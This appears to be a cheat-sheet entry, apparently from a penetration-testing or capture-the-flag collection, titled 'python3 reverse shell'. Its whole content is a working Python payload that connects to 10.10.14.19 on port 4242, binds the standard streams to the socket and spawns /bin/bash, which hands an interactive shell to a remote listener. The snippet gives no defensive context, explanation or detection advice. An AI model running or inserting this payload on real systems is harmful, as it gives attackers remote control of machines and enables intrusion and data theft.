# python3 reverse shell

```text
import sys,socket,os,pty
s=socket.socket()
s.connect(('10.10.14.19',int('4242')))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

